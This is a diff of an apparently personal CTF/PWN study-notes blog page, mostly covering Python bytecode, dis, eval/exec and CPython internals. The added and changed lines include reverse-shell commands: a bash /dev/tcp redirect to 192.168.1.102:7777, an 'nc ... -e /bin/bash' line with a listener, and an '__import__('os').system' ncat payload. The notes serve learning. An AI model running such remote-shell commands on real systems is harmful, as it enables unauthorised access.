@@ -28,7 +28,7 @@
 <meta property="og:image" content="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif">
 <meta property="og:image" content="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif">
 <meta property="article:published_time" content="2022-09-08T02:00:00.000Z">
-<meta property="article:modified_time" content="2022-11-19T01:03:20.825Z">
+<meta property="article:modified_time" content="2022-11-20T02:30:33.554Z">
 <meta property="article:author" content="Yogdzewa">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="PWN">
@@ -224,7 +224,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      973 分钟
+      979 分钟
     </span>
   
 
@@ -265,7 +265,7 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：2022年11月19日 上午
+                  不可视境界线最后变动于：2022年11月20日 上午
                 
               </p>
             
@@ -649,15 +649,20 @@
 </li>
 <li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pandana/p/16289320.html">反弹shell</a> </p>
 <ul>
-<li><p><code>bash -i &gt;&amp; /dev/tcp/192.168.1.102/7777 0&gt;&amp;1</code>　　（实际的命令解析为：将目标主机的bash shell以-i交互式的方式，标准输出+错误输出重定向到192.168.1.102:7777，而在192.168.1.102:7777的标准输入命令会重定向到192.168.1.102:7777的标准输出中）</p>
+<li><p>目标要执行的命令: <code>bash -i &gt;&amp; /dev/tcp/192.168.1.102/7777 0&gt;&amp;1</code>: 将目标主机的bash shell以-i交互式的方式，标准输出+错误输出重定向到192.168.1.102:7777，而在192.168.1.102:7777的标准输入命令会重定向到192.168.1.102:7777的标准输出中）</p>
 <p><strong>简言而知，就是将目标主机的标准输入、标准输出、错误输出全都重定向到攻击端上</strong> </p>
+</li>
+<li><p>上面这种是通过bash命令来反弹shell, 还可以通过<a target="_blank" rel="noopener" href="https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/">python nc perl php命令</a>来reverse.<br><code>nc 192.168.100.113 4444 –e /bin/bash</code> </p>
+<p><code>python -c ‘import socket,subprocess,os;................’</code> </p>
+</li>
+<li><p>而主机要执行<code>nc –lvp 4444</code>命令来监听特定端口号.</p>
 </li>
 </ul>
 </li>
 <li><p>python的bytecode真没了解过, 要暴毙了. 这能上哪儿搜. 跟cpython有挺大关系. 又查到了python vm. 又是python的fundamental, 我要疯了怎么又来这么多的东西. 一看就是一星期的量ahhhhhhhhhhhhhhhhhhhhh</p>
 </li>
 </ul>
-<h3 id="bytecode-relevant"><a href="#bytecode-relevant" class="headerlink" title="bytecode relevant:"></a>bytecode relevant:</h3><blockquote>
+<h3 id="Python-relevant"><a href="#Python-relevant" class="headerlink" title="Python relevant:"></a>Python relevant:</h3><blockquote>
 <p>python编译系统内部原理, 暂时可以不用关注:</p>
 <ul>
 <li>stackoverflow: <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/3299648/python-compilation-interpretation-process">bytecode instance</a> | <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/19916729/how-exactly-is-python-bytecode-run-in-cpython">theory</a>. 一篇巨长的<a target="_blank" rel="noopener" href="https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d">文章</a>, 连指令都全部列出来. </li>
@@ -683,10 +688,15 @@
 </li>
 <li><p>get information about live objects: <a target="_blank" rel="noopener" href="https://docs.python.org/3/library/inspect.html#module-inspect">Inspect</a> </p>
 <ul>
-<li><a target="_blank" rel="noopener" href="https://docs.python.org/3/library/inspect.html#types-and-members">Types and members</a> :<code>function.__code__.co_code</code> or <code>inspect.getmembers([func/module/class])</code> to see all members.</li>
+<li><a target="_blank" rel="noopener" href="https://docs.python.org/3/library/inspect.html#types-and-members">Types and members</a> :<code>function.__code__.co_code</code> to get code bytestring or <code>inspect.getmembers([func/module/class])</code> to see all members.</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>dis.dis(func) <span class="hljs-comment"># def func(a): b=&#x27;what&#x27;;return b[a]+8;</span><br>  <span class="hljs-number">2</span>           <span class="hljs-number">0</span> LOAD_CONST               <span class="hljs-number">1</span> (<span class="hljs-string">&#x27;what&#x27;</span>)<br>              <span class="hljs-number">2</span> STORE_FAST               <span class="hljs-number">1</span> (b)<br><br>  <span class="hljs-number">3</span>           <span class="hljs-number">4</span> LOAD_FAST                <span class="hljs-number">1</span> (b)<br>              <span class="hljs-number">6</span> LOAD_FAST                <span class="hljs-number">0</span> (a)<br>              <span class="hljs-number">8</span> BINARY_SUBSCR<br>             <span class="hljs-number">10</span> LOAD_CONST               <span class="hljs-number">2</span> (<span class="hljs-number">8</span>)<br>             <span class="hljs-number">12</span> BINARY_ADD<br>             <span class="hljs-number">14</span> RETURN_VALUE<br></code></pre></div></td></tr></table></figure></li>
 <li><p>python built-in function: <code>eval</code> &amp; <code>exec</code>. <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/2220699/whats-the-difference-between-eval-exec-and-compile">difference</a>: <code>eval</code> accepts only a <strong>single expression</strong>, <code>exec</code> can take a code block</p>
+</li>
+<li><p>python <a target="_blank" rel="noopener" href="https://docs.python.org/3/library/functions.html#__import__">built-in function</a>: the last one is <code>__import__</code>, This function is invoked by import statements. Direct use of <code>__import__()</code> is also discouraged in favor of <code>importlib.import_module()</code> </p>
+<ul>
+<li>e.g. <code>__import__(&#39;os&#39;).system(b&quot;ncat *.*.*.*&quot; &quot;****&quot; &quot;-e /bin/sh&quot;)</code> </li>
+</ul>
 </li>
 <li><p>ops:</p>
 <ul>
@@ -696,7 +706,7 @@
 <li><code>RETURN_VALUE</code> Returns with TOS to the caller of the function.</li>
 </ul>
 </li>
-<li><p>看了一圈我都不知道什么叫Calls the function in position 7 on the stack with the top three items on the stack as arguments.<br>4 5 6这三个位置就没用了?? 合着原来是填充. 我想我还是看看python innards比较好…..虽然是10年的post<br>然后发现在3.11的文档里是position 4. 啊这? 可能是预留位置防止后来加入东西<br>下面是<a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/main/Python/generated_cases.c.h">cpython源码</a>. main分支上的不在<code>ceval.c</code>中, 因为case语句太长就直接分成一个单独的文件<code>generated_cases.c.h</code>, 其余版本号分支仍在ceval. </p>
+<li><p>看了一圈我都不知道什么叫Calls the function in position 7 on the stack with the top three items on the stack as arguments.<br>4 5 6这三个位置就没用了?? 合着原来是填充. 我想我还是看看python innards比较好…..虽然是10年的post<br>然后发现在3.11的文档里是position 4. <del>啊这? 可能是预留位置防止后来加入东西</del><br>下面是<a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/main/Python/generated_cases.c.h">cpython源码</a>. main分支上的不在<code>ceval.c</code>中, 因为case语句太长就直接分成一个单独的文件<code>generated_cases.c.h</code>, 其余版本号分支仍在ceval. 已下载cpython 3.11源码, 可以看到一些定义之类的东西. </p>
 </li>
 </ul>
 <figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//branch 3.11:</span><br>		TARGET(WITH_EXCEPT_START) &#123;<br>            <span class="hljs-comment">/* At the top of the stack are 4 values:</span><br><span class="hljs-comment">               - TOP = exc_info()</span><br><span class="hljs-comment">               - SECOND = previous exception</span><br><span class="hljs-comment">               - THIRD: lasti of exception in exc_info()</span><br><span class="hljs-comment">               - FOURTH: the context.__exit__ bound method</span><br><span class="hljs-comment">               We call FOURTH(type(TOP), TOP, GetTraceback(TOP)).</span><br><span class="hljs-comment">               Then we push the __exit__ return value.</span><br><span class="hljs-comment">            */</span><br>            PyObject *exit_func;<br>            PyObject *exc, *val, *tb, *res;<br><br>            val = TOP();<br>            assert(val &amp;&amp; PyExceptionInstance_Check(val));<br>            exc = PyExceptionInstance_Class(val);<br>            tb = PyException_GetTraceback(val);<br>            Py_XDECREF(tb);<br>            assert(PyLong_Check(PEEK(<span class="hljs-number">3</span>)));<br>            exit_func = PEEK(<span class="hljs-number">4</span>);<br>            PyObject *<span class="hljs-built_in">stack</span>[<span class="hljs-number">4</span>] = &#123;<span class="hljs-literal">NULL</span>, exc, val, tb&#125;;<br>            res = PyObject_Vectorcall(exit_func, <span class="hljs-built_in">stack</span> + <span class="hljs-number">1</span>,<br>                    <span class="hljs-number">3</span> | PY_VECTORCALL_ARGUMENTS_OFFSET, <span class="hljs-literal">NULL</span>);<br>            <span class="hljs-keyword">if</span> (res == <span class="hljs-literal">NULL</span>)<br>                <span class="hljs-keyword">goto</span> error;<br><br>            PUSH(res);<br>            DISPATCH();<br>        &#125;<br><br><span class="hljs-comment">//but in branch 3.9-10:</span><br>            <span class="hljs-comment">/* At the top of the stack are 7 values:</span><br><span class="hljs-comment">               - (TOP, SECOND, THIRD) = exc_info()</span><br><span class="hljs-comment">               - (FOURTH, FIFTH, SIXTH) = previous exception for EXCEPT_HANDLER</span><br><span class="hljs-comment">               - SEVENTH: the context.__exit__ bound method</span><br><span class="hljs-comment">               We call SEVENTH(TOP, SECOND, THIRD).</span><br><span class="hljs-comment">               Then we push again the TOP exception and the __exit__</span><br><span class="hljs-comment">               return value.</span><br><span class="hljs-comment">            */</span><br></code></pre></div></td></tr></table></figure>
